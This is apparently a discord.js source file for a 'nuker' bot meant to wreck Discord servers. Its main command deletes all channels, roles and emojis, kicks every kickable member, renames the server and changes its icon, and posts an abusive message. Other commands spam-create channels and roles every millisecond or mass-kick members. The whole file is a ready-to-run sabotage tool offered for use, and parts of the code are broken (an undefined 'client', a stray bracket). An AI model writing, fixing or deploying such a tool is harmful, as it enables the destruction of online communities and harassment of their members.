const Discord = require('discord.js');
const nuker = new Discord.Client();
const config = require('./config.json');
const { yellow, blue, red, blueBright, bgCyan, bgGreen } = require("chalk");

nuker.on("ready", () => {
    console.log(red("============================================================================================================================"))
    console.log(yellow( `                                                                                                              
                                                                                                              
                                                                                                              
                                                                                                              
    ----    ---- ----    ---- ----    ---- ------------ -----------       
    *****   **** ****    **** ****   ****  ************ ***********       
    ------  ---- ----    ---- ----  ----   ----         ----    ---       
    ************ ****    **** *********    ************ *********         
    ------------ ----    ---- ---------    ------------ ---------         
    ****  ****** ************ ****  ****   ****         ****  ****        
    ----   ----- ------------ ----   ----  ------------ ----   ----       
    ****    **** ************ ****    **** ************ ****    ****      
                                                                                                                                                   
                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                              
                                                                                                       `))
    nuker.user.setActivity("YOUR_CUSTOM_STATUS_HERE", {
        type: "LISTENING"
      });

      console.log(blue(`
      Nuker: ${nuker.user.tag} || ${client.user.id}
      Prefix: ${config.prefix}  
      Servers: ${nuker.guilds.cache.size}
      Members: ${nuker.users.cache.size}
      Invite Link: https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot
      Author: Ahad3257
      `))
      console.log(red("============================================================================================================================"))
})

nuker.on("message", async (msg) => {
    if (!msg.content.startsWith(config.prefix) || msg.author.bot || !msg.guild ) return;
    if (msg.content.includes("nuke")) {
        await msg.guild.channels.cache.forEach((c) => c.delete(`CHANNEL DELETED BY ${msg.author.username}`, console.log(blue(`Deleted ${c.name} channel`))))
        msg.guild.members.cache.filter((m) => m.kickable).forEach(async (m) => {
            m.kick(`KICKED BY ${msg.author.username}`),
            console.log(red(`Kicked ${m.user.tag} | ${m.user.id}`))
        })

        await msg.guild.roles.cache.filter((r) => r.position < msg.guild.me.roles.highest ).forEach((r) => r.delete(`ROLE DELETED BY ${msg.author.username}`, console.log(blueBright(`Deleted ${r.name} role`))))
        msg.guild.emojis.cache.forEach((e) => e.delete(`EMOJI DELETED BY ${msg.author.username}`, console.log(red(`${e.name} emote deleted`))))
        const newChannel = await msg.guild.channels.create(`${msg.author.username}`)
            newChannel.send(`YOU ARE SUCCESSFULLY FUCKED BY **${msg.author.username}**`)
            msg.guild.setIcon(msg.author.displayAvatarURL({ dynamic: true }))
            console.log(bgCyan(`Setted Server's Icon to ${msg.author.avatarURL()}`))
            msg.guild.setName(`ПUKΣD BY ${msg.author.username}`) 
            console.log(bgGreen(`Setted Server's Name to ПUKΣD BY ${msg.author.username}`)) 
    }
    
        if(msg.content.includes("channel-spam")) {
        setInterval(() => {
        msg.guild.channels.create(`${msg.author.username}`).then((c) => {
        console.log(red(`[Channel Spam] - ${c.name}`));
        }).catch((e) => {

      });
  }, 1);
}

    if(msg.content.includes("channel-delete")) {
      msg.guild.channels.cache.forEach((c) => c.delete(`CHANNEL DELETED BY ${msg.author.username}`, console.log(blue(`[Channel Deleted] - ${c.name}`))));
}

    if(msg.content.includes("role-spam")) {
      setInterval(() => {
        msg.guild.roles.create({
            name: `${msg.author.username}`
        }).then((r) => {
            console.log(red(`[Role Spam] - ${r.name}`));
            }).catch((e) => {

        });
  }, 1)
}

    if(msg.content.includes("kick-all")) {
      msg.guild.members.cache.filter((m) => m.kickable).forEach(async (m) => {
        m.kick(`KICKED BY ${msg.author.username}`),
        console.log(red(`[Kicked] - ${m.user.tag} | ${m.user.id}`))
  });
}

if(msg.content.includes("help")) {
  msg.channel.send(`Client: ${client.user.tag} | ${client.user.id}\nPrefix: ${client.prefix}\nMade With ♥ By Ahad#3257\nCheck: https://www.itscruel.cf/` + "\n\n```yml\n" + `Command: ${client.prefix}nuke\nFunction: Deletes roles, channels, and kick members.\n\nCommand: ${client.prefix}channel-delete\nFunction: Deletes channels.\n\nCommand: ${client.prefix}channel-spam\nFunction: Spams channels.\n\nCommand: ${client.prefix}role-delete\nFunction: Spams roles.\n\nCommand: ${client.prefix}kick-all\nFunction: Kicks all members.\n` + "```")
}
});
})

nuker.login(config.token)
